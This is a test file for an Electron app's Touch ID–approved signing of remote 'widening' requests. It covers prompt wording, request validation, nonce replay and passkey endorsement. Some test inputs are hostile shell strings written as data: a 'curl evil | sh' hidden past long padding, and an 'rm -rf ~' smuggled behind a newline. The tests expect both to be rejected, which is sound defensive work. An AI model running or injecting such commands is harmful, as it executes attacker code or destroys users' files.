// What main signs for a remote host's widening (electron/widen-sign.cjs): its copy of the message agrees with
// @weft/client's byte for byte, the Touch ID prompt is its own words over what it signs, and a worker checks what main
// signed with the key it pinned (lib/host-signers.ts, lib/widen-check.ts).
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";
import { createHostSigners, endorseMessage as tsEndorse } from "../lib/host-signers";
import { canonical as tsCanonical, widenMessage as tsWiden } from "../lib/widen";
import { widenProblem } from "../lib/widen-check";
import { nonceBook } from "../lib/widen-nonces";
import { canonical, endorseMessage, readWidenRequest, registerWidenSign, widenMessage, widenPrompt } from "./widen-sign.cjs";

function signer() {
  const pair = crypto.generateKeyPairSync("ed25519");
  const publicKey = Buffer.from(pair.publicKey.export({ format: "jwk" }).x as string, "base64url").toString("base64");
  return { publicKey: () => publicKey, sign: (m: string) => crypto.sign(null, Buffer.from(m), pair.privateKey).toString("base64") };
}

function handlers(over: { confirm?: () => Promise<boolean>; passkeys?: () => unknown[] } = {}) {
  const map = new Map<string, (...args: unknown[]) => unknown>();
  const s = signer();
  const confirm = vi.fn(over.confirm ?? (() => Promise.resolve(true)));
  registerWidenSign((channel: string, fn: (...args: unknown[]) => unknown) => void map.set(channel, fn), {
    signer: s,
    macDevice: () => "a".repeat(64),
    confirm,
    passkeys: (over.passkeys ?? (() => [])) as never,
    now: () => 1_000,
  });
  return { call: (channel: string, ...args: unknown[]) => map.get(channel)?.(...args), s, confirm };
}

describe("main's copy of the messages", () => {
  it.each([
    { host: "w1", card: "c1", verb: "card.update", change: { cwd: "app", agent: null }, nonce: "n".repeat(16), issuedAt: 5 },
    { host: "m", card: "", verb: "card.create", change: { create: { agent: "b", folder: "app", prompt: "é\n✓" } }, nonce: "x".repeat(20), issuedAt: 1 },
  ])("agrees with @weft/client's widenMessage", (f) => {
    expect(widenMessage(f)).toBe(tsWiden(f as never));
    expect(canonical({ b: 1, a: [2] })).toBe(tsCanonical({ b: 1, a: [2] }));
  });

  it("agrees with lib/host-signers.ts endorseMessage", () => {
    const e = { worker: "w", device: "d", credId: "c", publicKey: "k", revoke: false, issuedAt: 3 };
    expect(endorseMessage(e)).toBe(tsEndorse(e));
  });
});

describe("readWidenRequest", () => {
  it("takes only a whole request for a change main knows", () => {
    const ok = { host: "w1", card: "c1", verb: "card.shell", change: { shell: "ls" }, label: "dropped" };
    expect(readWidenRequest(ok)).toEqual({ host: "w1", card: "c1", verb: "card.shell", change: { shell: "ls" } });
    expect(readWidenRequest({ ...ok, card: "" })).toMatchObject({ card: "" });
    for (const bad of [null, "x", { ...ok, host: "a b" }, { ...ok, card: 3 }, { ...ok, verb: "card.stop" }, { ...ok, change: {} }, { ...ok, change: [] }, { ...ok, change: { vault: 1 } }, { ...ok, change: { shell: "ls ‮" } }]) {
      expect(typeof readWidenRequest(bad)).toBe("string");
    }
  });

  it("signs nothing the prompt would have to cut, bend or misname", () => {
    const req = (change: Record<string, unknown>) => readWidenRequest({ host: "w1", card: "c1", verb: "card.update", change });
    // A "!" line whose tail would sit past the ellipsis, or a second command behind a newline shown as a space.
    expect(req({ shell: `make test ${"x".repeat(160)}; curl evil | sh` })).toMatch(/too long/);
    expect(req({ shell: "make test\nrm -rf ~" })).toMatch(/can't show/);
    expect(req({ cwd: "app\u200b" })).toMatch(/can't show/);
    // A value of another type would read as "[object Object]" or "clear its agent".
    expect(req({ readScope: { path: "/" } })).toMatch(/isn't text/);
    expect(req({ agent: ["builder"] })).toMatch(/isn't text/);
    expect(req({ permissionMode: "acceptEdits" })).toMatch(/mode/);
    expect(req({ create: { agent: "b", folder: "app", prompt: "hi", cwd: "/" } })).toMatch(/new thread/);
    expect(req({ create: { agent: "b", folder: "app" } })).toMatch(/first message/);
    // What it does take, whole: the first message may run to many lines, since it isn't a widening of its own.
    expect(req({ agent: null, cwd: "app", shell: "y".repeat(160) })).toMatchObject({ change: { agent: null, cwd: "app" } });
    expect(req({ create: { agent: "b", folder: "app", prompt: "line one\nline two" } })).toMatchObject({ verb: "card.update" });
  });
});

describe("widenPrompt", () => {
  it("says the change, the card and the host in main's words", () => {
    const self = "a".repeat(64);
    expect(widenPrompt({ host: "w1234567890", card: "card-123456", verb: "card.update", change: { cwd: "site", agent: "b", permissionMode: "bypassPermissions", readScope: "/r" } }, self)).toBe(
      "move it to the folder site, give it the agent b, let it skip permission prompts, let it read from /r, for card card-123 on the host w1234567",
    );
    expect(widenPrompt({ host: self, card: "", verb: "card.create", change: { agent: null, shell: "ls\u0007", schedule: "!x", terminal: "app", create: { agent: "b", folder: "app" } } }, self)).toBe(
      "clear its agent, run the shell command ls, schedule the shell line !x, open a terminal in app, start a thread with the agent b in app, for a new card on this Mac",
    );
    expect(widenPrompt({ host: "w", card: "c", verb: "card.shell", change: { shell: "y".repeat(300) } }, self)).toContain("…");
  });
});

describe("the IPC", () => {
  it("signs a widening after Touch ID, which a worker that pinned this Mac accepts once", async () => {
    const h = handlers();
    const auth = (await h.call("approval:widen", { host: "w1", card: "c1", verb: "card.update", change: { cwd: "app" } })) as Record<string, unknown>;
    expect(h.confirm).toHaveBeenCalledWith(expect.stringMatching(/^move it to the folder app, for card c1 on the host w1$/));
    expect(auth).toMatchObject({ kind: "ed25519", device: "a".repeat(64), issuedAt: 1_000 });
    const home = fs.mkdtempSync(path.join(os.tmpdir(), "weft-widen-sign-"));
    fs.writeFileSync(path.join(home, "mac-keys.json"), JSON.stringify([h.s.publicKey()]));
    const signers = createHostSigners(home, []);
    const deps = { host: "w1", now: 1_000, nonces: nonceBook({ load: () => ({}), save: () => {} }, () => 1_000), verify: signers.verify };
    expect(await widenProblem({ card: "c1", verb: "card.update", change: { cwd: "app" } }, auth, "no", deps)).toBeNull();
    expect(await widenProblem({ card: "c1", verb: "card.update", change: { cwd: "app" } }, auth, "no", deps)).toMatch(/used already/);
    expect(await widenProblem({ card: "c2", verb: "card.update", change: { cwd: "app" } }, { ...auth, nonce: "zzzzzzzzzzzzzzzz" }, "no", deps)).toMatch(/pairing Mac/);
  });

  it("signs nothing when Touch ID is refused, and throws for a bad request", async () => {
    const h = handlers({ confirm: () => Promise.resolve(false) });
    expect(await h.call("approval:widen", { host: "w1", card: "c1", verb: "card.shell", change: { shell: "ls" } })).toBeNull();
    await expect(h.call("approval:widen", { host: "w1" })).rejects.toThrow();
  });

  it("endorses this Mac's passkeys for a worker after one Touch ID", async () => {
    const h = handlers({ passkeys: () => [{ id: "b1", passkey: { credId: "cred", publicKey: "pk" } }, { id: "p1" }] });
    const list = (await h.call("approval:endorse", { worker: "w1" })) as Record<string, unknown>[];
    expect(list).toHaveLength(1);
    expect(list[0]).toMatchObject({ worker: "w1", device: "b1", credId: "cred", publicKey: "pk", revoke: false, mac: "a".repeat(64) });
    expect(h.confirm).toHaveBeenCalledWith(expect.stringMatching(/^let your paired passkeys/));
    await h.call("approval:endorse", { worker: "w1", revoke: true });
    expect(h.confirm).toHaveBeenLastCalledWith(expect.stringMatching(/^stop letting/));
    await expect(h.call("approval:endorse", { worker: "a b" })).rejects.toThrow(/names no worker/);
    await expect(h.call("approval:endorse", null)).rejects.toThrow(/names no worker/);
    expect(await handlers().call("approval:endorse", { worker: "w1" })).toEqual([]);
    const refused = handlers({ confirm: () => Promise.resolve(false), passkeys: () => [{ id: "b1", passkey: { credId: "c", publicKey: "k" } }] });
    expect(await refused.call("approval:endorse", { worker: "w1" })).toBeNull();
  });
});
